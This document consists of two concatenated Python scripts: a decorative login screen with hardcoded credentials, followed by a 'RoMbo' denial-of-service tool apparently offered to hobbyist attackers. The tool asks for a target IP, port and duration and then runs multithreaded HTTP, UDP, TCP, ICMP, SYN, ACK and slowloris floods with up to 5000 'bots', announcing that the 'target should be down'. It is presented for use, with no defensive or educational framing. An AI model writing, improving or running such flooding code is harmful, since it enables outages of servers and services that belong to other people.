import time
import os
import random
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

rombo_text = "★ TOOLS BY ROMBO 15X3 ★"

dragon_frame = r"""
░░███╗░░███████╗██╗░░██╗██████╗░
░████║░░██╔════╝╚██╗██╔╝╚════██╗
██╔██║░░██████╗░░╚███╔╝░░█████╔╝
╚═╝██║░░╚════██╗░██╔██╗░░╚═══██╗
███████╗██████╔╝██╔╝╚██╗██████╔╝
╚══════╝╚═════╝░╚═╝░░╚═╝╚═════╝░"""

line_colors = ["green", "bright_green", "cyan", "magenta"]
rain_chars = ["|", "!", "/", "\\", "1", "I"]

def generate_rain(width, height, density=0.05):
    rain = []
    for _ in range(height):
        line = "".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width))
        rain.append(line)
    return rain

def scroll_rain(rain_lines, width, density=0.05):
    rain_lines.pop(0)
    rain_lines.append("".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width)))

def hacker_interface(animated_time=5):  # Short animation duration
    width = console.width
    height = console.height - 10
    rain_lines = generate_rain(width, height)
    start_time = time.time()
    pos = 0
    direction = 1

    while time.time() - start_time < animated_time:
        clear()
        scroll_rain(rain_lines, width)
        for i, line in enumerate(rain_lines):
            color = line_colors[i % len(line_colors)]
            console.print(line, style=color)

        console.print(" " * pos + f"[bold red]{rombo_text}[/bold red]")

        panel = Panel(Text(dragon_frame, style="bold red"), title="[bold red]Access Granted[/bold red]", border_style="red", width=min(80, width - 6))
        console.print(panel, justify="center")

        pos += direction
        if pos >= width - len(rombo_text) - 10:
            direction = -1
        elif pos <= 0:
            direction = 1

        time.sleep(0.03)

def login_interface():
    clear()
    console.print(Panel("[bold red]★ Welcome to Rombo Security System ★[/bold red]", border_style="red"))
    username = console.input("[bold red]Enter Username: [/bold red]")
    password = console.input("[bold cyan]Enter Password: [/bold cyan]", password=True)

    if username == "rombo" and password == "15x3":
        console.print(f"[bold green]✔️ Welcome, {username}! Access granted.[/bold green]")
        time.sleep(0.5)
        hacker_interface(animated_time=5)  # Short animation
        clear()
        console.print("[bold green]✅ Starting the main tool...[/bold green]")
        # You can insert your main tool code here
        time.sleep(1)
        # start_main_tool()
    else:
        console.print(Panel("[bold red]❌ Incorrect Username or Password![/bold red]", border_style="red"))
        time.sleep(1)
        main()

def main():
    login_interface()

if __name__ == "__main__":
    main()
import socket
import time
import random
import threading
import requests
import sys
import os
import subprocess
import struct

# ألوان للواجهة
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

attack_running = True
bots_active = 0

BANNER = f"""
{Colors.BOLD}{Colors.RED}

██████╗░░█████╗░███╗░░░███╗██████╗░░█████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔══██╗
██████╔╝██║░░██║██╔████╔██║██████╦╝██║░░██║
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██║░░██║
██║░░██║╚█████╔╝██║░╚═╝░██║██████╦╝╚█████╔╝
╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═════╝░░╚════╝░▀ ░
▒▓▒░ ░  ░░░ ▒░ ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░
░▒ ░      ░ ░  ░░░▒░ ░ ░   ░▒ ░ ▒░  ░  ▒   
░░          ░     ░░░ ░ ░   ░░   ░ ░        
            ░  ░    ░        ░     ░ ░      
{Colors.END}
{Colors.CYAN}{'='*60}
{Colors.BOLD}instgram:its_rombo15 methods attack TOOL (199+ BOTS SUPPORT)
{Colors.CYAN}{'='*60}{Colors.END}
"""

# ===== POWR BOTS FUNCTIONS =====

def http_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                requests.get(f"http://{target}:{port}", timeout=1)
                print(f"{Colors.GREEN}[BOT-{bot_id}] HTTP Attack Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] HTTP Failed!{Colors.END}", end='\r')
            time.sleep(0.1)
    finally:
        bots_active -= 1

def udp_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while attack_running:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (target, port))
                print(f"{Colors.CYAN}[BOT-{bot_id}] UDP Packet Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] UDP Failed!{Colors.END}", end='\r')
            time.sleep(0.05)
    finally:
        bots_active -= 1
        sock.close()

def tcp_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(random._urandom(1024))
                print(f"{Colors.BLUE}[BOT-{bot_id}] TCP Packet Sent!{Colors.END}", end='\r')
                sock.close()
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] TCP Failed!{Colors.END}", end='\r')
            time.sleep(0.1)
    finally:
        bots_active -= 1

def ping_bot(target, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                subprocess.run(f"ping -c 1 {target}", 
                              shell=True,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
                print(f"{Colors.MAGENTA}[BOT-{bot_id}] ICMP Ping Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] ICMP Failed!{Colors.END}", end='\r')
            time.sleep(0.5)
    finally:
        bots_active -= 1

def launch_bots(attack_type, target, port, bots_count):
    global bots_active, attack_running
    
    bots_active = bots_count
    attack_running = True
    
    print(f"\n{Colors.YELLOW}[!] Launching {bots_count} BOTS...{Colors.END}")
    
    threads = []
    
    for bot_id in range(1, bots_count + 1):
        if attack_type == 1:
            t = threading.Thread(target=http_bot, args=(target, port, bot_id))
        elif attack_type == 2:
            t = threading.Thread(target=udp_bot, args=(target, port, bot_id))
        elif attack_type == 3:
            t = threading.Thread(target=tcp_bot, args=(target, port, bot_id))
        elif attack_type == 4:
            t = threading.Thread(target=ping_bot, args=(target, bot_id))
        else:
            print(f"{Colors.RED}Invalid attack type for launch_bots.{Colors.END}")
            return
        
        t.start()
        threads.append(t)
        print(f"{Colors.GREEN}[+] BOT-{bot_id} Activated!{Colors.END}")
        time.sleep(0.05)
    
    try:
        while bots_active > 0 and attack_running:
            print(f"{Colors.BOLD}Active BOTS: {bots_active}/{bots_count}{Colors.END}", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        attack_running = False
        print(f"\n{Colors.RED}[!] Stopping all bots...{Colors.END}")
    
    for t in threads:
        t.join()

# ===== RoMbo SCRIPT AS FUNCTION (بدون تسجيل دخول) =====

def start_RoMbo_attack():
    MAX_BOTS = 5000
    MAX_PACKET_SIZE = 65500
    MAX_ATTACK_TIME = 3600  # 1 hour

    os.system("cls" if os.name == "nt" else "clear")
    print("\033[1;35mWelcome to 15x3-RoMbo World - POWER EDITION\033[0m")
    time.sleep(1)
    print("\033[1;32mLoading Nuclear Codes...\033[0m")
    time.sleep(2)
    os.system("cls" if os.name == "nt" else "clear")

    print("""
\033[1;35m
	  AUTHOR TOOLS : 15x3 RoMbo - POWER EDITION


██████╗░░█████╗░███╗░░░███╗██████╗░░█████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔══██╗
██████╔╝██║░░██║██╔████╔██║██████╦╝██║░░██║
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██║░░██║
██║░░██║╚█████╔╝██║░╚═╝░██║██████╦╝╚█████╔╝
╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═════╝░░╚════╝░
""")

    ip = str(input(" Target IP: "))
    port = int(input(" Target Port: "))
    attack_time = int(input(" Attack Duration (seconds): "))
    thread_count = int(input(" Attack Bots (1-5000): "))
    attack_mode = int(input(" Attack Mode [1-5]: "))

    if thread_count < 1 or thread_count > MAX_BOTS:
        thread_count = MAX_BOTS
    if attack_time < 10 or attack_time > MAX_ATTACK_TIME:
        attack_time = 300
    if attack_mode < 1 or attack_mode > 5:
        attack_mode = 1

    PACKET_TYPES = {
        1: (1024, "UDP"),     
        2: (999, "TCP-SYN"),  
        3: (818, "TCP-ACK"),  
        4: (16, "TCP-PSH"),   
        5: (2048, "UDP-MAX")  
    }

    packet_size, attack_name = PACKET_TYPES[attack_mode]
    print(f"\033[1;33m[+] Starting {attack_name} attack with {thread_count} bots for {attack_time} seconds\033[0m")

    def create_raw_socket():
        try:
            if os.name == 'nt':
                return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                return s
        except:
            return None

    end_time = time.time() + attack_time

    def udp_flood():
        data = random._urandom(packet_size)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                s.sendto(data, (ip, port))
            except:
                pass

    def syn_flood():
        raw_socket = create_raw_socket()
        if not raw_socket:
            return
        
        while time.time() < end_time:
            try:
                raw_socket.sendto(random._urandom(packet_size), (ip, port))
            except:
                pass

    def ack_flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(random._urandom(packet_size))
            except:
                pass

    def http_flood():
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive"
        ]
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                request = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\n"
                for header in headers:
                    request += f"{header}\r\n"
                request += "\r\n"
                s.send(request.encode())
            except:
                pass

    def slowloris():
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Keep-Alive: timeout=100, max=1000",
            "Content-Length: 1000000"
        ]
        sockets = []
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                request = f"POST /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\n"
                for header in headers:
                    request += f"{header}\r\n"
                request += "\r\n"
                s.send(request.encode())
                sockets.append(s)
            except:
                pass
            
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                except:
                    sockets.remove(s)

    ATTACKS = {
        1: udp_flood,
        2: syn_flood,
        3: ack_flood,
        4: http_flood,
        5: slowloris
    }

    threads = []

    print(f"\033[1;31m[!] Launching {attack_name} attack with {thread_count} nuclear bots!\033[0m")
    time.sleep(2)

    for i in range(thread_count):
        try:
            t = threading.Thread(target=ATTACKS[attack_mode])
            t.daemon = True
            t.start()
            threads.append(t)
        except:
            pass

    start_time = time.time()
    while time.time() < end_time:
        elapsed = int(time.time() - start_time)
        remaining = attack_time - elapsed
        print(f"\033[1;33m[+] Attack in progress: {elapsed}s elapsed, {remaining}s remaining - {len(threads)} bots active\033[0m", end='\r')
        time.sleep(1)

    print("\n\033[1;32m[+] Attack completed successfully! Target should be down!\033[0m")
    print("\033[1;36m[+] Join our community: discord.gg/8gmRVnRRwV\033[0m")


# ===== MAIN PROGRAM =====
def main():
    global attack_running
    
    try:
        print(BANNER)
        
        print(f"{Colors.YELLOW}{'='*30} POWR Methods SETUP {'='*30}{Colors.END}")
        print(f"{Colors.CYAN}1. HTTP Flood Attack")
        print("2. UDP Flood Attack")
        print("3. TCP Flood Attack")
        print("4. ICMP Ping Flood")
        print("5. ADVANCED RoMbo ATTACK"+Colors.END)
        
        choice = int(input("\nWhat kind of attack do you want? (1-5): "))
        
        if choice not in [1, 2, 3, 4, 5]:
            print(f"{Colors.RED}[-] Invalid Choice!{Colors.END}")
            return
        
        if choice == 5:
            # نداء سكربت نودوس بدون تسجيل دخول
            start_RoMbo_attack()
            return
        
        target = input("Target IP: ")
        
        port = 80
        if choice in [1, 2, 3]:
            port = int(input("Target Port: "))
        
        bots_count = int(input("POWR BOTS Count (1-1000): "))
        bots_count = max(1, min(bots_count, 1000))
        
        duration = int(input("Attack Duration (seconds): "))
        
        print(f"\n{Colors.RED}{'='*30} ATTACK STARTED {'='*30}{Colors.END}")
        start_time = time.time()
        
        attack_thread = threading.Thread(
            target=launch_bots,
            args=(choice, target, port, bots_count)
        )
        attack_thread.start()
        
        try:
            while time.time() < start_time + duration and attack_running:
                elapsed = int(time.time() - start_time)
                remaining = max(0, duration - elapsed)
                print(f"{Colors.BOLD}Elapsed: {elapsed}s | Remaining: {remaining}s | Bots: {bots_active}/{bots_count}{Colors.END}", end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            attack_running = False
            attack_thread.join()
        
        print(f"\n\n{Colors.GREEN}{'='*30} ATTACK COMPLETED {'='*30}{Colors.END}")
        print(f"{Colors.YELLOW}Total Attack Duration: {duration} seconds")
        print(f"Maximum Bots Activated: {bots_count}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}[-] ERROR: {str(e)}{Colors.END}")
    finally:
        attack_running = False

if __name__ == "__main__":
    main()